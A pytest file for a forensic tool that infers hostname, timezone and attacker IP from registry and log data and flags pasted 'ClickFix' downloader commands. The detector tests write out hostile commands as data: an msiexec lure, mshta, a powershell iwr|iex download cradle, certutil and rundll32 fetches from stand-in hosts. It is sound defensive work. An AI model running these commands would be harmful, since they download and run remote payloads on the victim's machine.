"""Tests for answers that were confidently wrong.

Every case here came out of one real KAPE collection, and each one had the same
shape: a registry key holds several values, only one of them is the answer, and the
tool offered whichever the store returned first. A wrong answer at 0.75 confidence
is worse than no answer, because the analyst has nothing to distinguish it from a
right one.
"""
from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path

import pytest

from inspecthor import infer
from inspecthor.models import Event
from inspecthor.sherlock import answer_question
from inspecthor.store.store import CaseStore

TS = datetime(2026, 2, 2, 17, 19, 1, tzinfo=timezone.utc)


def _event(event_type: str, data: dict, **kw) -> Event:
    return Event(
        timestamp=kw.pop("timestamp", TS),
        timestamp_desc="Registry key last write",
        message=f"{event_type}: {data.get('name')} = {data.get('value')}",
        event_type=event_type,
        source_artifact=kw.pop("source_artifact", "registry/system"),
        data=data,
        **kw,
    )


@pytest.fixture
def store(tmp_path: Path):
    """The two registry keys exactly as a real SYSTEM hive held them."""
    st = CaseStore(str(tmp_path / "case.db"))
    key_cn = r"ControlSet001\Control\ComputerName\ComputerName"
    key_tz = r"ControlSet001\Control\TimeZoneInformation"
    st.add_events_bulk([
        # (Default) is written first, and is not the hostname.
        _event("computer_name", {"key": key_cn, "name": "(Default)", "value": "mnmsrvc"}),
        _event("computer_name", {"key": key_cn, "name": "ComputerName", "value": "OKIMV1"}),
        # Bias sorts before ActiveTimeBias, and the MUI names before both.
        _event("system_timezone",
               {"key": key_tz, "name": "Bias", "value": "360", "utc_offset": "UTC-06:00"}),
        _event("system_timezone",
               {"key": key_tz, "name": "DaylightName", "value": "@tzres.dll,-161"}),
        _event("system_timezone",
               {"key": key_tz, "name": "StandardName", "value": "@tzres.dll,-162"}),
        _event("system_timezone",
               {"key": key_tz, "name": "TimeZoneKeyName", "value": "Central Standard Time"}),
        _event("system_timezone",
               {"key": key_tz, "name": "ActiveTimeBias", "value": "300",
                "utc_offset": "UTC-05:00"}),
        # 61 loopback logons, which is what a workstation normally looks like.
        *[_event("logon_success", {"source_ip": "127.0.0.1", "logon_type": "5"},
                 source_artifact="evtx/Security", user="SYSTEM") for _ in range(61)],
        _event("logon_failed", {"source_ip": "10.1.69.118", "logon_type": "3"},
               source_artifact="evtx/Security", user="admin"),
        _event("logon_failed", {"source_ip": "10.1.69.118", "logon_type": "3"},
               source_artifact="evtx/Security", user="admin"),
    ])
    st.finalize()
    try:
        yield st
    finally:
        st.close()


# ---- hostname ----------------------------------------------------------------


def test_hostname_answer_ignores_the_default_value(store):
    """'mnmsrvc' is the key's (Default) value, not the computer's name."""
    answers = [c.answer for c in answer_question(store, "What is the hostname?")]
    assert answers[0] == "OKIMV1"
    assert "mnmsrvc" not in answers


def test_inferred_host_ignores_the_default_value(store):
    """This one mislabelled the whole case, not just one answer."""
    host, source = infer.host_from_events(store)
    assert host == "OKIMV1"
    assert "ComputerName" in source


# ---- timezone ----------------------------------------------------------------


def test_timezone_answer_leads_with_the_zone_name(store):
    answers = [c.answer for c in answer_question(store, "What is the system timezone?")]
    assert answers[0] == "Central Standard Time"


def test_unresolved_mui_strings_are_never_offered_as_answers(store):
    """'@tzres.dll,-161' is a resource reference. It answers nothing, and it used
    to push the real answer off the end of the list."""
    answers = [c.answer for c in answer_question(store, "What is the timezone?")]
    assert not any("tzres" in a for a in answers), answers
    assert not any(a.startswith("@") for a in answers), answers


def test_inferred_timezone_prefers_activetimebias_over_bias(store):
    """Both live in the same key and differ by the DST hour. Taking whichever row
    came back first put every inferred syslog timestamp an hour out."""
    tz, source = infer.timezone_from_events(store)
    assert tz is not None
    assert tz.utcoffset(None).total_seconds() / 3600 == -5.0
    assert "ActiveTimeBias" in source
    assert "UTC-05:00" in source


def test_timezone_source_never_names_a_value_it_did_not_use(tmp_path: Path):
    """Bias alone must not be reported as ActiveTimeBias — the source string exists
    so the analyst can catch exactly this."""
    st = CaseStore(str(tmp_path / "bias_only.db"))
    try:
        st.add_events_bulk([_event(
            "system_timezone",
            {"key": "k", "name": "Bias", "value": "360", "utc_offset": "UTC-06:00"},
        )])
        st.finalize()
        tz, source = infer.timezone_from_events(st)
        assert tz.utcoffset(None).total_seconds() / 3600 == -6.0
        assert "ActiveTimeBias" not in source
        assert "Bias" in source
    finally:
        st.close()


# ---- attacker IP -------------------------------------------------------------


def test_loopback_is_not_offered_as_the_attacker_ip(store):
    """61 logons from ::1 outvoted the 2 real remote failures, so 'most_common'
    confidently named the victim's own machine."""
    answers = [c.answer for c in answer_question(store, "What is the attacker's IP address?")]
    assert "127.0.0.1" not in answers
    assert answers[0] == "10.1.69.118"


# ---- transaction logs --------------------------------------------------------


@pytest.mark.parametrize("name", [
    "Amcache.hve.LOG1", "NTUSER.DAT.LOG2", "SYSTEM.LOG1", "DEFAULT.LOG",
])
def test_registry_transaction_logs_are_not_claimed(name):
    """They open with the same 'regf' magic as a hive, so magic matching claimed
    them at full confidence and each one produced an error line."""
    from inspecthor.parsers.plugins.registry_hive import RegistryHiveParser

    assert RegistryHiveParser().sniff(Path(name), b"regf\x00\x00\x00\x00") == 0.0


@pytest.mark.parametrize("name", ["SYSTEM", "NTUSER.DAT", "Amcache.hve"])
def test_real_hives_are_still_claimed(name):
    from inspecthor.parsers.plugins.registry_hive import RegistryHiveParser

    assert RegistryHiveParser().sniff(Path(name), b"regf\x00\x00\x00\x00") > 0.0


# ---- pasted commands ---------------------------------------------------------

# The real one, from a real collection. Backslashes after the scheme, mixed case,
# and traversal padding built out of legitimate Windows directory names.
REAL_LURE = (r"msiEXeC.exe -packaGE http:\\mkvn.us.com/system32/..\update/../"
             r"winsxs/../UserID57426917 /Q")


@pytest.mark.parametrize("text", [
    REAL_LURE,
    r"msiexec /i http://198.51.100.7/a.msi /qn",
    r"mshta https://example.test/p.hta",
    r"powershell -w h -c iwr http://example.test/a.ps1|iex",
    r"certutil -urlcache -f http://example.test/x.exe x.exe",
    r"rundll32 \\198.51.100.7\share\a.dll,Entry",
])
def test_pasted_downloader_is_flagged(text):
    from inspecthor.parsers.plugins.registry_hive import _is_pasted_lure

    assert _is_pasted_lure(text), text


@pytest.mark.parametrize("text", [
    "cmd", "explorer", "MRUList", r"\\fileserver\share", "https://intranet.local",
    "msiexec /x {90140000-0011-0000-0000-0000000FF1CE}", "regedit", "mmc", "notepad",
    r"C:\Users\me\Documents", "cmd /c dir",
])
def test_ordinary_typed_commands_are_not_flagged(text):
    """A lone URL just opens a browser and a lone LOLBin is plausible. Requiring
    both is what keeps this from becoming another 9,726-false-positive rule."""
    from inspecthor.parsers.plugins.registry_hive import _is_pasted_lure

    assert not _is_pasted_lure(text), text


def test_the_backslash_scheme_spelling_is_not_missed():
    """'http:\\host' is what a Windows path habit produces, and a naive 'http://'
    check misses it. The real sample was spelled this way."""
    from inspecthor.parsers.plugins.registry_hive import _is_pasted_lure

    assert _is_pasted_lure(r"msiexec -package http:\\evil.test/a /Q")
    assert _is_pasted_lure(r"msiexec -package http://evil.test/a /Q")


def test_pasted_lure_maps_to_the_clickfix_technique():
    """T1204.004 is 'Malicious Copy and Paste' and must resolve in the bundled DB,
    since an unvalidated id is dropped and the finding loses its attribution."""
    from inspecthor.attack import AttackDB

    db = AttackDB()
    assert db.valid(["T1204.004"]) == ["T1204.004"]
    assert db.name_of("T1204.004") == "Malicious Copy and Paste"
